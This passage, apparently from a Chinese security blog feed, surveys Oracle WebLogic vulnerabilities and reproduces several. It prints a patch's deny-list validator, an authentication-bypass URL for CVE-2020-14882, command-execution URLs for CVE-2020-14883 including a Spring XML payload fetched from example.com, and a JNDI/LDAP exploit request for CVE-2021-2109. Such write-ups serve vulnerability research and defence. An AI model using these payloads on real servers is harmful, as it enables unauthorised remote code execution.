class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">validate</span><span class="params">(InputStream is)</span> </span>&#123;</span><br><span class="line">   WebLogicSAXParserFactory factory = <span class="keyword">new</span> WebLogicSAXParserFactory();</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      SAXParser parser = factory.newSAXParser();</span><br><span class="line">      parser.parse(is, <span class="keyword">new</span> DefaultHandler() &#123;</span><br><span class="line">         <span class="keyword">private</span> <span class="keyword">int</span> overallarraylength = <span class="number">0</span>;</span><br><span class="line">         <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">"object"</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:object"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">"class"</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:class"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">"new"</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:new"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">"method"</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:method"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">"void"</span>)) &#123;</span><br><span class="line">                  <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; attributes.getLength(); ++i) &#123;</span><br><span class="line">                     <span class="keyword">if</span> (!<span class="string">"index"</span>.equalsIgnoreCase(attributes.getQName(i))) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid attribute for element void:"</span> + attributes.getQName(i));</span><br><span class="line">                     &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">"array"</span>)) &#123;</span><br><span class="line">                  String attClass = attributes.getValue(<span class="string">"class"</span>);</span><br><span class="line">                  <span class="keyword">if</span> (attClass != <span class="keyword">null</span> &amp;&amp; !attClass.equalsIgnoreCase(<span class="string">"byte"</span>)) &#123;</span><br><span class="line">                     <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"The value of class attribute is not valid for array element."</span>);</span><br><span class="line">                  &#125;</span><br><span class="line">                  String lengthString = attributes.getValue(<span class="string">"length"</span>);</span><br><span class="line">                  <span class="keyword">if</span> (lengthString != <span class="keyword">null</span>) &#123;</span><br><span class="line">                     <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">int</span> length = Integer.valueOf(lengthString);</span><br><span class="line">                        <span class="keyword">if</span> (length &gt;= WorkContextXmlInputAdapter.MAXARRAYLENGTH) &#123;</span><br><span class="line">                           <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Exceed array length limitation"</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">this</span>.overallarraylength += length;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">this</span>.overallarraylength &gt;= WorkContextXmlInputAdapter.OVERALLMAXARRAYLENGTH) &#123;</span><br><span class="line">                           <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Exceed over all array limitation."</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                     &#125; <span class="keyword">catch</span> (NumberFormatException var8) &#123;</span><br><span class="line">……</span><br></pre></td></tr></table></figure><h1 id="CVE-2019-2729"><a href="#CVE-2019-2729" class="headerlink" title="CVE-2019-2729"></a>CVE-2019-2729</h1><p>详情可看此文章：<a href="https://xz.aliyun.com/t/5448" target="_blank" rel="noopener">cve-2019-2729挖掘思路 - cve-2019-2725 bypass</a>  </p><p>补丁：<br>Oracle选择使用白名单而不是黑名单。 通过新引入的validateFormat()函数来实现，其中白名单规则在WorkContextFormatInfo中定义 。<br><img src="../../images/java/weblogic/34.png" alt=""></p><h1 id="Weblogic远程代码执行漏洞（CVE-2020-2546）"><a href="#Weblogic远程代码执行漏洞（CVE-2020-2546）" class="headerlink" title="Weblogic远程代码执行漏洞（CVE-2020-2546）"></a>Weblogic远程代码执行漏洞（CVE-2020-2546）</h1><p>漏洞描述：该漏洞通过T3协议实现利用、攻击者可通过此漏洞实现远程代码执行.    </p><p>影响版本：WebLogic Server 10.3.6.0.0 、WebLogic Server 12.1.3.0.0</p><h1 id="Weblogic-IIOP反序列化漏洞（CVE-2020-2551）"><a href="#Weblogic-IIOP反序列化漏洞（CVE-2020-2551）" class="headerlink" title="Weblogic IIOP反序列化漏洞（CVE-2020-2551）"></a>Weblogic IIOP反序列化漏洞（CVE-2020-2551）</h1><p><a href="https://xz.aliyun.com/t/7498" target="_blank" rel="noopener">Weblogic IIOP 协议NAT 网络绕过</a></p><h1 id="管理控制台未授权远程命令执行漏洞（CVE-2020-14882，CVE-2020-14883）"><a href="#管理控制台未授权远程命令执行漏洞（CVE-2020-14882，CVE-2020-14883）" class="headerlink" title="管理控制台未授权远程命令执行漏洞（CVE-2020-14882，CVE-2020-14883）"></a>管理控制台未授权远程命令执行漏洞（CVE-2020-14882，CVE-2020-14883）</h1><p>CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台，CVE-2020-14883允许后台任意用户通过HTTP协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个GET请求在远程Weblogic服务器上以未授权的任意用户身份执行命令。</p><p>影响版本：    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Oracle WeblogicServer 10.3.6.0.0</span><br><span class="line">Oracle WeblogicServer 12.1.3.0.0</span><br><span class="line">Oracle WeblogicServer 12.2.1.3.0</span><br><span class="line">Oracle WeblogicServer 12.2.1.4.0</span><br><span class="line">Oracle WeblogicServer 14.1.1.0.0</span><br></pre></td></tr></table></figure><p>漏洞复现<br>首先测试权限绕过漏洞（CVE-2020-14882），访问以下URL，即可未授权访问到管理后台页面：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;your-ip:7001&#x2F;console&#x2F;css&#x2F;%252e%252e%252fconsole.portal</span><br></pre></td></tr></table></figure><p>访问后台后，可以发现我们现在是低权限的用户，无法安装应用，所以也无法直接执行任意代码：</p><p>此时需要利用到第二个漏洞CVE-2020-14883。这个漏洞的利用方式有两种，一是通过com.tangosol.coherence.mvel2.sh.ShellSession，二是通过com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext。</p><p>直接访问如下URL，即可利用com.tangosol.coherence.mvel2.sh.ShellSession执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=<span class="literal">true</span>&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(<span class="string">"java.lang.Runtime.getRuntime().exec('touch%20/tmp/success1');"</span>)</span><br></pre></td></tr></table></figure><p>进入容器，可以发现touch /tmp/success1已成功执行：</p><p>这个利用方法只能在Weblogic 12.2.1以上版本利用，因为10.3.6并不存在com.tangosol.coherence.mvel2.sh.ShellSession类。</p><p>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext是一种更为通杀的方法，最早在CVE-2019-2725被提出，对于所有Weblogic版本均有效。</p><p>首先，我们需要构造一个XML文件，并将其保存在Weblogic可以访问到的服务器上，如<a href="http://example.com/rce.xml：" target="_blank" rel="noopener">http://example.com/rce.xml：</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"pb"</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span> <span class="attr">init-method</span>=<span class="string">"start"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>bash<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>&lt;![CDATA[touch /tmp/success2]]&gt;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后通过如下URL，即可让Weblogic加载这个XML，并执行其中的命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;your-ip:7001&#x2F;console&#x2F;css&#x2F;%252e%252e%252fconsole.portal?_nfpb&#x3D;true&amp;_pageLabel&#x3D;&amp;handle&#x3D;com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http:&#x2F;&#x2F;example.com&#x2F;rce.xml&quot;)</span><br></pre></td></tr></table></figure><h1 id="CVE-2021-2109"><a href="#CVE-2021-2109" class="headerlink" title="CVE-2021-2109"></a>CVE-2021-2109</h1><p><a href="https://github.com/feihong-cs/JNDIExploit" target="_blank" rel="noopener">JNDIExploit工具下载</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 本地ip -p http监听端口</span><br></pre></td></tr></table></figure><p><img src="../../images/java/weblogic/36.png" alt=""><br>命令执行poc： </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET  /console/css/%252e%252e%252f/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=<span class="literal">true</span>&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.124;13:1389/Basic/WeblogicEcho;AdminServer%22) HTTP/1.1</span><br><span class="line">Host: 192.168.124.11:7001</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">cmd:id</span><br><span class="line">Cookie: ADMINCONSOLESESSION=yWWFg11WL9ZGG2HPTwQ7FCQ11vptGWvhMLNJTp6TjJV8Vnvy17KS!1320888643</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure><p><img src="../../images/java/weblogic/35.png" alt=""></p><p>参考文章： </p><p><a href="https://xie1997.blog.csdn.net/article/details/103916943" target="_blank" rel="noopener">Weblogic相关漏洞</a><br><a href="https://github.com/vulhub/vulhub/blob/master/weblogic/CVE-2020-14882/README.zh-cn.md" target="_blank" rel="noopener">Weblogic 管理控制台未授权远程命令执行漏洞</a><br><a href="https://www.kumamon.fun/weblogic-CVE-2015-4852-CVE-2016-0638-CVE-2016-3510/" target="_blank" rel="noopener">从Weblogic原理上探究CVE-2015-4852、CVE-2016-0638、CVE-2016-3510究竟怎么一回事</a><br><a href="https://badcode.cc/2018/04/24/Weblogic-%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E-CVE-2018-2628-%E6%BC%AB%E8%B0%88/" target="_blank" rel="noopener">Weblogic 反序列漏洞 CVE-2018-2628 漫谈</a><br><a href="https://www.freebuf.com/vuls/178105.html" target="_blank" rel="noopener">天融信关于CVE-2018-2893 WebLogic反序列化漏洞分析</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVA EE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
</feed>
